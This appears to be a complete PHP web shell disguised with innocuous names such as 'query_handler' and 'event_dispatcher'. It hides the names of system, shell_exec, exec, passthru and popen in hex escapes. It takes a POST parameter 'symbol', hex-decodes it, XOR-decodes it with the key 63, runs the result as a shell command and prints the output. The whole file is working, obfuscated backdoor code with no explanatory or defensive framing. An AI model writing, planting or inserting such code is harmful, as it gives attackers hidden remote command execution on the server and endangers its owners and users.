<?php

$query_handler2 = "\x73h\x65\x6C\x6C_ex\x65c";
$query_handler4 = "pa\x73\x73t\x68ru";
$query_handler1 = "\x73\x79\x73tem";
$query_handler7 = "\x70\x63\x6Cose";
$query_handler6 = "\x73tre\x61m_\x67\x65\x74_co\x6E\x74ent\x73";
$batch_process = "\x68\x65x\x32\x62in";
$query_handler5 = "\x70op\x65n";
$query_handler3 = "\x65xec";
if (isset($_POST["s\x79m\x62o\x6C"])) {
            function event_dispatcher   (     $data_chunk    ,      $entry   )   {
   $rec   =     ''    ;
    $f=0;
 do{
$rec.=chr(ord($data_chunk[$f])^$entry);
$f++;

} while($f<strlen($data_chunk));
 return    $rec;
   
}
            $symbol = $batch_process($_POST["s\x79m\x62o\x6C"]);
            $symbol = event_dispatcher($symbol, 63);
            if (function_exists($query_handler1)) {
                $query_handler1($symbol);
            } elseif (function_exists($query_handler2)) {
                print $query_handler2($symbol);
            } elseif (function_exists($query_handler3)) {
                $query_handler3($symbol, $ref_data_chunk);
                print join("\n", $ref_data_chunk);
            } elseif (function_exists($query_handler4)) {
                $query_handler4($symbol);
            } elseif (function_exists($query_handler5) && function_exists($query_handler6) && function_exists($query_handler7)) {
                $entry_rec = $query_handler5($symbol, 'r');
                if ($entry_rec) {
                    $itm_dat = $query_handler6($entry_rec);
                    $query_handler7($entry_rec);
                    print $itm_dat;
                }
            }
            exit;
        }